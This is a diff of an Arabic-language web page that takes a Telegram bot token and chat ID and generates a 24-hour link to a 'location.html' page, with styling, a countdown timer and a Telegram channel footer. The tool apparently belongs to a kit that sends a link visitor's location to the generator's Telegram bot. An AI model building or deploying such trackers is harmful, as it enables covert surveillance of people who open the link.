@@ -3,29 +3,134 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>إدخال التوكن والمعرف</title>
+    <title>إنشاء رابط الموقع</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(to right, #6a11cb, #2575fc);
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            height: 100vh;
+            text-align: center;
+        }
+
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 20px;
+        }
+
+        form {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+        }
+
+        label {
+            font-size: 1.2rem;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 5px;
+            background: rgba(255, 255, 255, 0.2);
+            color: #fff;
+            font-size: 1rem;
+        }
+
+        button {
+            background: #4CAF50;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            font-size: 1rem;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        button:hover {
+            background: #45a049;
+        }
+
+        #generatedLink {
+            margin-top: 20px;
+            display: none;
+            background: rgba(0, 0, 0, 0.1);
+            padding: 15px;
+            border-radius: 10px;
+            word-wrap: break-word;
+        }
+
+        #generatedLink a {
+            color: #FFD700;
+            font-weight: bold;
+            text-decoration: none;
+            font-size: 1.2rem;
+        }
+
+        #timer {
+            margin-top: 10px;
+            font-size: 1rem;
+        }
+
+        footer {
+            margin-top: 30px;
+            font-size: 1rem;
+            text-align: center;
+        }
+
+        .telegram-logo {
+            width: 20px;
+            vertical-align: middle;
+        }
+
+        footer a {
+            color: #FFD700;
+            text-decoration: none;
+            font-weight: bold;
+        }
+    </style>
 </head>
 <body>
-    <h1>أدخل التوكن ومعرف الدردشة</h1>
+    <h1>إنشاء رابط الموقع</h1>
     <form id="tokenForm">
         <label for="token">التوكن:</label>
-        <input type="text" id="token" name="token" required><br><br>
+        <input type="text" id="token" name="token" placeholder="أدخل التوكن" required><br>
         
         <label for="chat_id">معرف الدردشة:</label>
-        <input type="text" id="chat_id" name="chat_id" required><br><br>
+        <input type="text" id="chat_id" name="chat_id" placeholder="أدخل معرف الدردشة" required><br>
         
         <button type="submit">إنشاء رابط</button>
     </form>
 
-    <div id="generatedLink" style="display:none;">
-        <h2>الرابط الخاص بك:</h2>
-        <a id="link" href="" target="_blank">اضغط هنا للوصول إلى صفحة الموقع</a>
+    <div id="generatedLink">
+        <h2>رابطك:</h2>
+        <p id="link"></p>
+        <div id="timer"></div>
     </div>
+
+    <footer>
+        <p>حقوق النشر © 2024. جميع الحقوق محفوظة.</p>
+        <p>
+            <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram" class="telegram-logo">
+            <a href="https://t.me/+qZ06s9H7I944YWYy" target="_blank">اشتركوا في قناتنا على تلجرام</a>
+        </p>
+    </footer>
 
     <script>
         const form = document.getElementById("tokenForm");
         const generatedLinkDiv = document.getElementById("generatedLink");
         const linkElement = document.getElementById("link");
+        const timerElement = document.getElementById("timer");
 
         form.addEventListener("submit", (event) => {
             event.preventDefault();
@@ -33,13 +138,59 @@
             const token = document.getElementById("token").value;
             const chat_id = document.getElementById("chat_id").value;
 
-            // إنشاء الرابط باستخدام التوكن ومعرف الدردشة
-            const generatedLink = ` location.html?token=${encodeURIComponent(token)}&chat_id=${encodeURIComponent(chat_id)}`;
+            // التحقق من وجود رابط صالح في التخزين المحلي
+            const existingData = JSON.parse(localStorage.getItem("userLinkData"));
+            const currentTime = new Date().getTime();
+
+            if (existingData && currentTime < existingData.expiryTime) {
+                const timeLeft = existingData.expiryTime - currentTime;
+                alert("يمكنك إنشاء رابط جديد بعد انتهاء صلاحية الرابط الحالي!");
+                startCountdown(timeLeft);
+                displayLink(existingData.link);
+                return;
+            }
+
+            // إنشاء الرابط
+            const generatedLink = `location.html?token=${encodeURIComponent(token)}&chat_id=${encodeURIComponent(chat_id)}`;
+
+            // حساب وقت انتهاء الرابط (24 ساعة)
+            const expiryTime = currentTime + 24 * 60 * 60 * 1000;
+
+            // حفظ البيانات في التخزين المحلي
+            localStorage.setItem("userLinkData", JSON.stringify({ link: generatedLink, expiryTime }));
 
             // عرض الرابط
-            linkElement.href = generatedLink;
-            generatedLinkDiv.style.display = "block";
+            displayLink(generatedLink);
+
+            // بدء العد التنازلي
+            startCountdown(expiryTime - currentTime);
         });
+
+        function displayLink(link) {
+            linkElement.textContent = link;
+            linkElement.style.color = "#FFD700";
+            generatedLinkDiv.style.display = "block";
+        }
+
+        function startCountdown(timeLeft) {
+            const interval = setInterval(() => {
+                const days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
+                const hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+                const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
+                const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);
+
+                timerElement.textContent = `تاريخ انتهاء الرابط: ${days} أيام ${hours} ساعات ${minutes} دقائق ${seconds} ثواني`;
+
+                if (timeLeft <= 0) {
+                    clearInterval(interval);
+                    timerElement.textContent = "انتهت صلاحية الرابط!";
+                    linkElement.textContent = "الرابط لم يعد صالحًا.";
+                    linkElement.style.color = "red";
+                }
+
+                timeLeft -= 1000;
+            }, 1000);
+        }
     </script>
 </body>
 </html>
